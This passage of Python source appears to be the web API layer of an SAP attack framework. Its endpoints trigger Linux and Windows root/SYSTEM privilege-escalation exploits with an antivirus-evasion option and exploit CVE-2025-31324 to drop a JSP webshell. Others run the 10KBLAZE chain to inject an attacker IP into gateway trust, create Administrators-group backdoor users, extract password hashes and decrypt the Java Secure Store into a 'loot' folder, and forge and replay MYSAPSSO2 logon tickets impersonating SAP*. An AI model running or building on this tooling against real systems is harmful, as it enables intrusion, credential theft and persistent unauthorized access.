                df = res.get("dirtyfrag") or {}
                # One headline finding per method, tagged with severity
                # by viability so the operator sees all three lines.
                sapmap_findings.emit_finding(
                    "HIGH" if cf.get("vulnerable") else "INFO", sid,
                    f"Copy Fail (CVE-2026-31431): "
                    f"{'VULNERABLE' if cf.get('vulnerable') else 'not vulnerable'}"
                    f" — kernel {cf.get('kernel', '?')}. "
                    f"{cf.get('reason', '')}",
                    ref="lpe.copyfail.check", meta=cf,
                    attack_capability="lpe.copyfail")
                sapmap_findings.emit_finding(
                    "HIGH" if pc.get("vulnerable") else "INFO", sid,
                    f"pedit-COW (CVE-2026-46331): "
                    f"{'VULNERABLE' if pc.get('vulnerable') else 'not vulnerable'}"
                    f" — kernel {pc.get('kernel', '?')} arch "
                    f"{pc.get('arch', '?')}. {pc.get('reason', '')}",
                    ref="lpe.peditcow.check", meta=pc,
                    attack_capability="lpe.peditcow")
                sapmap_findings.emit_finding(
                    "HIGH" if df.get("vulnerable") else "INFO", sid,
                    f"Dirty Frag: "
                    f"{'VULNERABLE' if df.get('vulnerable') else 'not vulnerable'}"
                    f" — kernel {df.get('kernel', '?')} arch "
                    f"{df.get('arch', '?')}. {df.get('reason', '')}",
                    ref="lpe.dirtyfrag.check", meta=df,
                    attack_capability="lpe.dirtyfrag")
                if method:
                    sapmap_findings.emit_finding(
                        "INFO", sid,
                        f"Auto-picker selected: {method}.  {res.get('summary','')}",
                        ref="lpe.linux.method")
            except Exception as e:
                print(f"[-] {sid}: check_linux_lpe error: {e}")
            finally:
                _task_end(f"{sid}:check_linux_lpe")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_windows_lpe", method="POST")
    def node_check_windows_lpe(sid):
        """Probe Windows LPE prerequisites on the target.  Currently
        covers three techniques:
          * EfsPotato (SeImpersonate -> SYSTEM via MS-EFSRPC coercion)
          * GodPotato (SeImpersonate -> SYSTEM via DCOM unmarshal)
          * MiniPlasma (cldflt.sys race, CVE-2020-17103 un-patched)
        The auto-picker reports which technique is viable + which
        it would select."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            _task_start(f"{sid}:check_windows_lpe",
                        f"{sid}: checking Windows SYSTEM LPE")
            try:
                from sapmap_winlpe_auto import check_windows_lpe
                res = check_windows_lpe(node)
                method = res.get("method") or ""
                ef = res.get("efspotato") or {}
                gp = res.get("godpotato") or {}
                mp = res.get("miniplasma") or {}
                # One headline finding per technique tagged with severity
                # by viability so the operator sees a complete picture
                # of what's possible on this host.
                sapmap_findings.emit_finding(
                    "HIGH" if ef.get("vulnerable") else "INFO", sid,
                    f"EfsPotato (MS-EFSRPC -> SYSTEM): "
                    f"{'VULNERABLE' if ef.get('vulnerable') else 'not vulnerable'}"
                    f" — Windows {ef.get('os_build', '?')} "
                    f"SeImpersonate={'held' if ef.get('has_impersonate') else 'NOT held'}. "
                    f"{ef.get('reason', '')}",
                    ref="lpe.efspotato.check", meta=ef,
                    attack_capability="lpe.efspotato")
                sapmap_findings.emit_finding(
                    "HIGH" if gp.get("vulnerable") else "INFO", sid,
                    f"GodPotato (SeImpersonate -> SYSTEM): "
                    f"{'VULNERABLE' if gp.get('vulnerable') else 'not vulnerable'}"
                    f" — Windows {gp.get('os_build', '?')} "
                    f"SeImpersonate={'held' if gp.get('has_impersonate') else 'NOT held'}. "
                    f"{gp.get('reason', '')}",
                    ref="lpe.godpotato.check", meta=gp,
                    attack_capability="lpe.godpotato")
                sapmap_findings.emit_finding(
                    "HIGH" if mp.get("vulnerable") else "INFO", sid,
                    f"MiniPlasma (CVE-2020-17103 un-patched): "
                    f"{'VULNERABLE' if mp.get('vulnerable') else 'not vulnerable'}"
                    f" — Windows {mp.get('os_build', '?')} "
                    f".NET {mp.get('net_version', '?')}. "
                    f"{mp.get('reason', '')}",
                    ref="lpe.miniplasma.check", meta=mp,
                    attack_capability="lpe.miniplasma")
                if method:
                    sapmap_findings.emit_finding(
                        "INFO", sid,
                        f"Auto-picker selected: {method}.  "
                        f"{res.get('summary','')}",
                        ref="lpe.windows.method")
            except Exception as e:
                print(f"[-] {sid}: check_windows_lpe error: {e}")
            finally:
                _task_end(f"{sid}:check_windows_lpe")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exploit_windows_lpe", method="POST")
    def node_exploit_windows_lpe(sid):
        """Run a shell command as NT AUTHORITY\\SYSTEM using the best
        available Windows LPE technique.  Currently MiniPlasma only —
        future-proofed via the same picker shape as the Linux LPE
        endpoint."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        command = data.get("command", "whoami")
        av_evasion = bool(data.get("av_evasion", False))

        def _run():
            _task_start(f"{sid}:exploit_windows_lpe",
                        f"{sid}: Windows LPE — running: {command}"
                        + (" (AV evasion)" if av_evasion else ""))
            try:
                from sapmap_winlpe_auto import run_windows_lpe
                res = run_windows_lpe(node, command,
                                      av_evasion=av_evasion)
                method = res.get("method") or "?"
                if res.get("ok"):
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"SYSTEM obtained via {method} on {sid}.  "
                        f"Command: {command!r}.  "
                        f"Output: {res.get('stdout', '')[:200]}",
                        ref=f"lpe.{method}.system_obtained",
                        meta={"command": command,
                              "method": method,
                              "stdout": res.get("stdout", "")[:500]})
                    print(f"[+] {sid}: {method} SYSTEM — output: "
                          f"{res.get('stdout', '')[:300]!r}")
                else:
                    print(f"[-] {sid}: Windows LPE failed: "
                          f"{res.get('error')}")
            except Exception as e:
                print(f"[-] {sid}: exploit_windows_lpe error: {e}")
            finally:
                _task_end(f"{sid}:exploit_windows_lpe")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exploit_linux_lpe", method="POST")
    @app.route("/api/node/<sid>/exploit_copyfail",  method="POST")  # legacy alias
    def node_exploit_linux_lpe(sid):
        """Run a shell command as root using a Linux LPE technique.

        Accepts an optional ``method`` field in the POST body
        (``"copyfail"`` / ``"peditcow"`` / ``"dirtyfrag"``).  When set,
        that technique is used verbatim — no auto-pick, no cached-method
        reuse.  When omitted, the auto-picker decides (prefers Copy Fail).
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        command = data.get("command", "id")
        chosen_method = (data.get("method") or "").strip().lower() or None
        if chosen_method and chosen_method not in ("copyfail", "peditcow", "dirtyfrag"):
            return json.dumps({"error": f"Unknown LPE method "
                                          f"{chosen_method!r}"})

        def _run():
            label = (f"{sid}: Linux LPE ({chosen_method}) — running: "
                     f"{command}") if chosen_method else (
                     f"{sid}: Linux LPE — running: {command}")
            _task_start(f"{sid}:exploit_linux_lpe", label)
            try:
                from sapmap_lpe_auto import run_linux_lpe
                res = run_linux_lpe(node, command, method=chosen_method)
                method = res.get("method") or "?"
                if res.get("ok"):
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"Root obtained via {method} on {sid}.  "
                        f"Command: {command!r}.  "
                        f"Output: {res.get('stdout', '')[:200]}",
                        ref=f"lpe.{method}.root_obtained",
                        meta={"command": command,
                              "method": method,
                              "stdout": res.get("stdout", "")[:500]})
                    print(f"[+] {sid}: {method} root — output: "
                          f"{res.get('stdout', '')[:300]!r}")
                else:
                    print(f"[-] {sid}: Linux LPE failed: {res.get('error')}")
            except Exception as e:
                print(f"[-] {sid}: exploit_linux_lpe error: {e}")
            finally:
                _task_end(f"{sid}:exploit_linux_lpe")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_java_table", method="POST")
    def node_download_java_table(sid):
        """Run a SELECT against the Java stack's DB via JSP/JDBC."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})
        table  = (data.get("table") or "").strip()
        fields = (data.get("fields") or "*").strip()
        where  = (data.get("where") or "").strip()
        try:
            max_rows = int(data.get("max_rows") or 500)
        except Exception:
            max_rows = 500
        if not table:
            return json.dumps({"error": "table is required"})

        def _run():
            r = sapmap_exploit.download_java_table(
                node, table, fields=fields, where=where, max_rows=max_rows)
            if r.get("success"):
                # Stash for the modal to pick up
                if not hasattr(node, "java_table_dumps"):
                    node.java_table_dumps = []
                node.java_table_dumps.append({
                    "table": table, "columns": r.get("columns", []),
                    "rows": r.get("rows", []),
                    "row_count": r.get("row_count", 0),
                })
                # Persist to loot/tables/ as CSV
                import os as _os
                from datetime import datetime as _dt
                import sapmap_state as _ss
                loot_dir = _ss.ensure_loot_dir("tables")
                ts = _dt.now().strftime("%Y%m%d_%H%M%S")
                fpath = _os.path.join(loot_dir,
                    f"table_java_{sid}_{table.replace('.','_')}_{ts}.csv")
                import csv as _csv
                with open(fpath, "w", newline="", encoding="utf-8") as fh:
                    w = _csv.writer(fh)
                    w.writerow(r.get("columns", []))
                    for row in r.get("rows", []):
                        w.writerow(row)
                print(f"[+] {sid}: rows written to {fpath}")

        _bg(f"{sid}:download_java_table", "Download Java Table", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/extract_java_hashes", method="POST")
    def node_extract_java_hashes(sid):
        """Extract UME password hashes + J2EE_CONFIGENTRY credential entries."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.extract_java_password_hashes(node)
            if r.get("success"):
                print(f"[+] {sid}: hash extraction summary — "
                      f"{r.get('count', 0)} UME hashes, "
                      f"{r.get('configentry_secret_count', 0)} configentry "
                      f"secrets, file: {r.get('file_path')}")

        _bg(f"{sid}:extract_java_hashes", "Extract Java Hashes", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/impact_assess_java", method="POST")
    def node_impact_assess_java(sid):
        """Run Java business-impact scenarios (PI/PO, NWDI/CTS+, HR/ESS,
        KMC, audit tamper) against a Java/dual-stack node."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.assess_java_impact(node, api.state)
            if r.get("success"):
                hits = len(r.get("results", []))
                print(f"[+] {sid}: Java impact assessment complete — "
                      f"{hits} scenario(s) applicable on this stack "
                      f"({r.get('components', 0)} components inventoried)")
            else:
                print(f"[-] {sid}: Java impact assessment failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:impact_assess_java", "Assess Java Business Impact", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/read_java_destinations", method="POST")
    def node_read_java_destinations(sid):
        """Read all JCo destinations from J2EE_CONFIGENTRY, plot the
        downstream targets on the map, and import their credentials."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java/dual-stack system"})

        def _run():
            r = sapmap_exploit.read_java_destinations(node, api.state)
            if r.get("success"):
                print(f"[+] {sid}: read_java_destinations summary: "
                      f"{len(r.get('destinations', []))} destinations, "
                      f"{r['added_nodes']} new nodes plotted, "
                      f"{r['credentials_added']} creds imported, "
                      f"{r['added_edges']} RFC edges drawn")
            else:
                print(f"[-] {sid}: read_java_destinations failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:read_java_destinations", "Read Java JCo Destinations", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/java_secstore", method="POST")
    def node_java_secstore(sid):
        """Extract + decrypt the Java Secure Store; import credentials and
        auto-plot downstream ABAP systems + RFC edges."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if "JAVA" not in (node.system_type or "").upper():
            return json.dumps({"error": "Not a Java / dual-stack system"})

        def _run():
            r = sapmap_exploit.extract_java_secstore(node, api.state)
            if r.get("success"):
                print(f"[+] {sid}: Java Secure Store extraction summary: "
                      f"{r['entries_count']} entries, "
                      f"{r['credentials_added']} credentials imported, "
                      f"{r['downstream_added']} downstream node(s) added, "
                      f"{r['edges_added']} RFC edge(s) drawn")
                if r.get("credentials_added"):
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"Java Secure Store decrypted — "
                        f"{r['credentials_added']} credential(s) imported, "
                        f"{r['downstream_added']} downstream system(s) added",
                    )
            else:
                print(f"[-] {sid}: Java Secure Store extraction failed: "
                      f"{r.get('error', '?')}")

        _bg(f"{sid}:java_secstore", "Extract Java Secure Store", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user_java", method="POST")
    def node_create_user_java(sid):
        """Create a Java stack user via the UME API exposed by a deployed JSP.

        Body: {username, password, group?, method? = "auto"|"cve_31324"|"gw"}
        Responds synchronously with the CreatedUser result (or error).
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        username = (data.get("username") or "SAPMAP00").strip()
        password = (data.get("password") or "").strip()
        group    = (data.get("group") or "Administrators").strip()
        method   = (data.get("method") or "auto").strip()

        # Java-only guard.  Skip for method='sapcontrol' — the
        # operator explicitly picked that channel against a target
        # they know is Java (SAPControl runs on both stacks, so we
        # can't fingerprint from the URL alone), and placeholder
        # nodes from Type-G materialisation land here with
        # system_type=''.  Operator-reported: pure-Java stack
        # (jstart-only) refused by this early check even though
        # create_user_java has its own bypass now.
        sys_type = (node.system_type or "").upper()
        if method != "sapcontrol" and "JAVA" not in sys_type:
            return json.dumps({"error": "Not a Java / dual-stack system"})
        # For method='sapcontrol' the caller supplies a Type-G
        # connection whose SAPControl OSExecute is already verified.
        # We look it up on the source node so the connection modal
        # can call this endpoint with just (source_sid, dest_name)
        # instead of shipping URL / user / password over the wire.
        sc_source_sid = (data.get("sapcontrol_source_sid") or "").strip()
        sc_dest_name  = (data.get("sapcontrol_dest_name") or "").strip()
        sc_url = sc_user = sc_pwd = sc_os_hint = ""
        if method == "sapcontrol":
            if not (sc_source_sid and sc_dest_name):
                return json.dumps({"error": (
                    "method=sapcontrol requires sapcontrol_source_sid "
                    "and sapcontrol_dest_name")})
            src_node = api.state.get_node(sc_source_sid)
            if not src_node:
                return json.dumps({"error": (f"SAPControl source node "
                                                f"{sc_source_sid} not found")})
            sc_conn = None
            for c in api.state.get_connections_from(sc_source_sid):
                if c.destination_name == sc_dest_name:
                    sc_conn = c
                    break
            if not sc_conn:
                return json.dumps({"error": (f"SAPControl connection "
                                                f"{sc_dest_name} not found "
                                                f"on {sc_source_sid}")})
            if not sc_conn.os_exec_verified:
                return json.dumps({"error": (
                    f"connection {sc_dest_name} is not "
                    "os_exec_verified — run Test Connection first")})
            sc_url  = sc_conn.http_url or ""
            sc_user = sc_conn.rfc_user or ""
            sc_pwd  = sc_conn.secstore_password or ""
            # os_hint from Test Connection's uname probe — pass it
            # through so the deploy helper doesn't fall back to
            # _is_linux_target(node) which returns False for
            # placeholder targets whose os_type is empty.
            sc_os_hint = (sc_conn.target_os_hint or "").strip()
            if not (sc_url and sc_user and sc_pwd):
                return json.dumps({"error": (
                    f"connection {sc_dest_name} missing url / user / "
                    "password on the source connection")})

        def _run():
            created = sapmap_exploit.create_user_java(
                node, api.state, username=username, password=password,
                group=group, method=method,
                sapcontrol_url=sc_url,
                sapcontrol_user=sc_user,
                sapcontrol_pwd=sc_pwd,
                sapcontrol_os_hint=sc_os_hint)
            if created:
                api.state.track_created_user(created)

        _bg(f"{sid}:create_user_java", "Create Java User", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exploit_cve_2025_31324", method="POST")
    def node_exploit_cve_2025_31324(sid):
        """Exploit CVE-2025-31324.  mode: "command" (default) | "dropshell".
        For "command" supply a "command" field (string).  Responds
        synchronously with the execution result."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        if not node.cve_2025_31324_vulnerable:
            return json.dumps({"error": "CVE-2025-31324 not confirmed on "
                                         "this node — run Check first"})

        mode = data.get("mode", "command")
        if mode == "dropshell":
            result = sapmap_exploit.drop_cve_2025_31324_shell(node)
            if result.get("success"):
                print(f"[+] {sid}: JSP webshell dropped at {result['shell_url']}")
            else:
                print(f"[-] {sid}: dropshell failed: "
                      f"{result.get('error', '?')}")
            return json.dumps(result)

        # mode == "command"
        cmd = (data.get("command") or "").strip()
        if not cmd:
            return json.dumps({"error": "command is required"})
        # Auto-wrap in shell based on node OS (same pattern as exec_command)
        os_type = (node.os_type or "").lower()
        is_win = any(w in os_type for w in ("windows", "nt", "win"))
        # If OS unknown, assume Windows (SJJ-style SAP Java is commonly Windows);
        # user can override via Set OS Type.
        if not os_type or is_win:
            wrapped = f"cmd.exe /C {cmd}"
        else:
            wrapped = f"/bin/sh -c {cmd!r}"
        result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, wrapped)
        return json.dumps(result)

    @app.route("/api/node/<sid>/betrusted_chain", method="POST")
    def node_betrusted_chain(sid):
        """Full 10KBLAZE chain: betrusted → check GW trust → SAPXPG → create user."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        attacker_ip  = data.get("attacker_ip", "").strip()
        nilist_wait  = float(data.get("nilist_wait", 30.0))
        client       = data.get("client")

        stop_event = threading.Event()
        key = f"{sid}:betrusted_chain"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                created = sapmap_exploit.create_user_betrusted_chain(
                    node, api.state,
                    attacker_ip=attacker_ip,
                    nilist_wait=nilist_wait,
                    client=client,
                    stop_event=stop_event,
                )
                if created:
                    api.state.track_created_user(created)
                    sapmap_exploit._post_exploit_enrichment(node, api.state, proven_type="ABAP")
            finally:
                _unregister_betrusted_stop(key)

        _bg(key, "10KBLAZE Full Chain", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/betrusted", method="POST")
    def node_betrusted(sid):
        """Execute betrusted attack: register fake app server, hold TCP connection open,
        and poll gateway trust.  Uses try_betrusted_chain() so the MS connection stays
        alive while the GW check runs — the connection is only closed once we confirm
        whether the gateway trusts us (or after 5 min timeout)."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        attacker_ip = data.get("attacker_ip", "").strip()
        if not attacker_ip:
            return json.dumps({"error": "attacker_ip is required"})

        if not node.ms_port:
            return json.dumps({"error": "MS internal port not known — run Check MS first"})

        nilist_wait = float(data.get("nilist_wait", 30.0))

        stop_event = threading.Event()
        key = f"{sid}:betrusted"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                print(f"[*] {sid}: Running betrusted attack on "
                      f"{node.ip or node.hostname}:{node.ms_port} "
                      f"→ injecting {attacker_ip} into gateway trust list")
                # try_betrusted_chain keeps the MS connection alive while polling GW
                ok = sapmap_exploit.try_betrusted_chain(
                    node, api.state,
                    attacker_ip=attacker_ip,
                    nilist_wait=nilist_wait,
                    stop_event=stop_event,
                )
                if stop_event.is_set():
                    pass   # exploit already logged cancellation
                elif ok:
                    print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
                          f"— GW exploit is available")
                else:
                    print(f"[-] {sid}: Gateway did not become trusted. "
                          f"Try 'Create User (10KBLAZE Full Chain)' for the automated chain.")
            finally:
                stop_event.set()   # ensure betrusted thread exits
                _unregister_betrusted_stop(key)

        _bg(key, "Betrusted Attack", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user", method="POST")
    def node_create_user(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "credentials")

        client = data.get("client")

        def _run():
            if method == "gw_exploit":
                created = sapmap_exploit.create_user_gw_exploit(node, api.state,
                                                                 client=client)
            elif method == "dpmon_sap_star":
                # dpmon virtual SAP* (kernel >= 790, ABAP only).
                # Eligibility is enforced inside the function — bails
                # gracefully on kernel < 790 or non-ABAP stacks.
                created = sapmap_exploit.create_user_via_dpmon_sap_star(
                    node, api.state, client=client)
            else:
                created = sapmap_exploit.create_user_via_credentials(node, api.state)
            if created:
                api.state.track_created_user(created)
                sapmap_exploit._post_exploit_enrichment(node, api.state, proven_type="ABAP")
                # Auto-run the capability analyser — operator just
                # owned a new user; surfacing what that user can
                # actually do is the natural next step.
                try:
                    import sapmap_capability_analyser
                    _cs, _ = resolve_soap_session_for_node(
                        api.state, node)
                    sapmap_capability_analyser.analyse(
                        node, soap_session=_cs)
                except Exception as e:
                    print(f"[-] {sid}: capability analyser auto-run "
                          f"failed — {e!s}")

        _bg(f"{sid}:create_user", "Create User", _run)
        return json.dumps({"status": "started"})

    # ── MYSAPSSO2 ticket forgery (Phase D commits 7-9) ──────────────
    #
    # Two endpoints, both background-task driven:
    #
    #   POST /api/node/<sid>/forge_ticket
    #     {user, client, validity_min, digest, pin?,
    #      recipient_sid?, recipient_client?}
    #   -> extract_and_forge_ticket(node, state, ...) — runs the full
    #      PSE-extract -> cred_v2-decrypt -> key-extract -> forge ->
    #      save-artifacts chain.  Result lands on node.forged_tickets
    #      + state.forged_tickets and surfaces in /api/state.
    #
    #   POST /api/node/<sid>/propagate_ticket
    #     {ticket_index, target_sids?, channels?}
    #   -> propagate_via_forged_ticket / propagate_to_trusted_subgraph
    #      against the named receivers, recording results on the
    #      ticket's used_on list.

    @app.route("/api/node/<sid>/forge_ticket", method="POST")
    def node_forge_ticket(sid):
        """Forge a MYSAPSSO2 logon ticket impersonating an arbitrary
        user, signed by the issuing system's SAPSYS.pse.

        Body parameters (all optional unless noted):
            user              str   default "SAP*"
            client            str   default "100"
            validity_min      int   default 120
            digest            str   default "sha256"  (use "sha1" for
                                       DSA-signed SAPSYS.pse on older
                                       kernels)
            pin               str   optional — bypass the candidate
                                       walk and use this PIN directly
            recipient_sid     str   optional STRUSTSSO2 pin
            recipient_client  str   optional STRUSTSSO2 client pin
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        user = data.get("user") or "SAP*"
        client = str(data.get("client") or "100")
        validity_min = int(data.get("validity_min") or 120)
        digest = data.get("digest") or "sha256"
        pin = data.get("pin")
        recipient_sid = data.get("recipient_sid") or None
        recipient_client = data.get("recipient_client") or None

        def _run():
            from sapmap_exploit import extract_and_forge_ticket
            r = extract_and_forge_ticket(
                node=node, state=api.state,
                user=user, client=client,
                validity_min=validity_min, digest=digest,
                pin=pin,
                recipient_sid=recipient_sid,
                recipient_client=recipient_client,
            )
            if r.get("success"):
                print(f"[+] {sid}: MYSAPSSO2 ticket forged for "
                      f"{user!r}@{client} — "
                      f"{r['ticket_size']}B, loot {r['loot_path']}")
            else:
                print(f"[-] {sid}: ticket forgery failed — "
                      f"{r.get('error', '?')}")
                # Print the per-step audit so the operator sees where
                # the chain broke (cred_v2 / key_extract / forge / ...)
                for step in r.get("steps", []):
                    mark = "✓" if step["ok"] else "✗"
                    print(f"      [{mark}] {step['name']:14s} "
                          f"{step.get('detail', '')[:100]}")

        _bg(f"{sid}:forge_ticket", "Forge MYSAPSSO2 Ticket", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/propagate_ticket", method="POST")
    def node_propagate_ticket(sid):
        """Replay a previously forged MYSAPSSO2 ticket against one or
        more STRUSTSSO2-trusted receivers.

        Body parameters:
            ticket_index    int   index into node.forged_tickets
                                  (default 0 — most-recent forgery)
            target_sids     list  receivers to try.  When omitted,
                                  defaults to the issuer SID itself
                                  (self-trust) — operators can add
                                  more by passing the SIDs they read
                                  from STRUSTSSO2 / TWPSSO2ACL.
            channels        list  subset of ["http", "rfc"]
                                  (default both)
            timeout         int   per-attempt seconds (default 10)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        if not node.forged_tickets:
            return json.dumps({"error":
                f"{sid} has no forged tickets — run forge_ticket first"})

        ticket_idx = int(data.get("ticket_index") or 0)
        if ticket_idx < 0 or ticket_idx >= len(node.forged_tickets):
            return json.dumps({"error":
                f"ticket_index={ticket_idx} out of range "
                f"(node has {len(node.forged_tickets)} ticket(s))"})

        ticket = node.forged_tickets[ticket_idx]
        target_sids = data.get("target_sids") or [sid]
        channels = data.get("channels") or ["http", "rfc"]
        timeout = int(data.get("timeout") or 10)

        def _run():
            from sap_ticket_propagate import (
                propagate_to_trusted_subgraph)
            print(f"[*] {sid}: propagating ticket "
                  f"{ticket.display_label()} -> "
                  f"{', '.join(target_sids)}")
            print(f"[*] {sid}: channels requested = "
                  f"{', '.join(channels)}; "
                  f"timeout = {timeout}s")
            r = propagate_to_trusted_subgraph(
                ticket=ticket, state=api.state,
                candidate_sids=target_sids,
                channels=channels, timeout=timeout)
            print(f"[*] {sid}: propagation done — "
                  f"{r['succeeded']}/{r['tried']} succeeded")

            # Per-target ICM discovery summary
            for entry in r["results"]:
                disc = entry.get("icm_discovery") or ""
                if disc == "ICM_GET_INFO":
                    print(f"      [i] {entry['sid']}: ICM ports "
                          f"discovered via RFC FM ICM_GET_INFO "
                          f"(authoritative)")
                elif disc == "fallback":
                    print(f"      [i] {entry['sid']}: ICM_GET_INFO "
                          f"unavailable — using profile / scanner "
                          f"/ convention fallback")

            # Per-target aggregate verdict + per-channel attempt
            # detail.  Earlier code only printed the aggregate
            # ``[mark] sid channel evidence`` line, which on a
            # multi-channel failure showed only the LAST channel's
            # error (typically "pyrfc not available" when pyrfc
            # isn't installed) — masking the real HTTP failure
            # reason.  Now we drill in.
            for entry in r["results"]:
                mark = "✓" if entry["success"] else "✗"
                channel = entry.get("channel") or "—"
                ev = (entry.get("evidence")
                      or entry.get("error", ""))[:120]
                print(f"      [{mark}] {entry['sid']:6s} "
                      f"{channel:6s} {ev}")
                # Surface why a channel was skipped entirely
                # (e.g. pyrfc missing) so the operator
                # understands whether their environment is
                # the limit or the target's config is.
                skipped = entry.get("rfc_skipped_reason") or ""
                if skipped:
                    print(f"            [i] rfc channel skipped: "
                          f"{skipped}")
                # Per-attempt detail — one line per (port, path)
                # combo tried.  Compact format so a propagation
                # against 20 receivers x 3 paths x 2 ports stays
                # readable, but the operator can still see
                # exactly which endpoint accepted or rejected.
                for att in entry.get("attempts", []):
                    a_mark = "✓" if att.get("success") else "✗"
                    a_chan = att.get("channel", "—")
                    if a_chan == "http":
                        port_str = str(att.get("port", "?"))
                        scheme = "https" if att.get("use_https") else "http"
                        endpoint = (f"{scheme}://{port_str}"
                                     f"{att.get('path', '?')}")
                    else:
                        endpoint = a_chan
                    a_ev = (att.get("evidence")
                            or att.get("error", ""))[:100]
                    print(f"            [{a_mark}] {endpoint:50s} "
                          f"{a_ev}")

        _bg(f"{sid}:propagate_ticket", "Propagate MYSAPSSO2 Ticket",
            _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/discover_strustsso2", method="POST")
    def node_discover_strustsso2(sid):
        """Discover STRUSTSSO2 trust relationships on this node.

        Reads USREXTID / USRACL / SSF_C_GET_CERTIFICATE_LIST_OF_PSE
        to identify which issuer PSEs this system trusts, then
        cross-references each entry against known
        SAPNode.sapsys_cert_subject_dn values to resolve issuer SIDs.
        New TrustRelation entries are added to state.trust_relations.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] {sid}: no credentials available for "
                      f"STRUSTSSO2 discovery")
                return
            from sapmap_models import TrustRelation
            _strust_sess2, _ = resolve_soap_session_for_node(
                api.state, node)
            if _strust_sess2 is not None:
                entries = (
                    sapmap_rfc.retrieve_strustsso2_trust_via_soap(
                        node, _strust_sess2))
            else:
                entries = sapmap_rfc.retrieve_strustsso2_trust(
                    node, creds)

            # Build lookup of known SAPSYS cert DNs across the
            # landscape so we can resolve issuer_sid where possible.
            cert_to_sid = {}
            for other_sid, other_node in api.state.nodes.items():
                dn = (other_node.sapsys_cert_subject_dn or "").strip()
                if dn:
                    cert_to_sid[dn] = other_sid

            existing_keys = {
                (r.trusting_sid, r.issuer_sid,
                 r.issuer_cert_subject_dn, r.issuer_cert_serial)
                for r in api.state.trust_relations
            }

            sys_added = 0
            usr_added = 0
            resolved = 0
            user_identities = []  # for the user-kind intelligence dump
            for e in entries:
                subject = e.get("subject_dn", "") or ""
                serial = e.get("serial", "") or ""
                kind = e.get("kind", "system")

                if kind == "user":
                    # User-level identity mappings: record on node for
                    # intelligence display, but DON'T treat as
                    # ticket-forgery trust edges.
                    user_identities.append({
                        "extid": subject,
                        "bname": e.get("issuer_dn", ""),
                        "trusting_client": e.get(
                            "trusting_client", ""),
                        "source": e.get("source", ""),
                    })
                    usr_added += 1
                    continue

                # System-level trust → real TrustRelation
                issuer_sid_direct = e.get("issuer_sid", "") or ""
                issuer_sid_lookup = cert_to_sid.get(subject, "")
                issuer_sid = issuer_sid_direct or issuer_sid_lookup
                key = (sid, issuer_sid, subject, serial)
                if key in existing_keys:
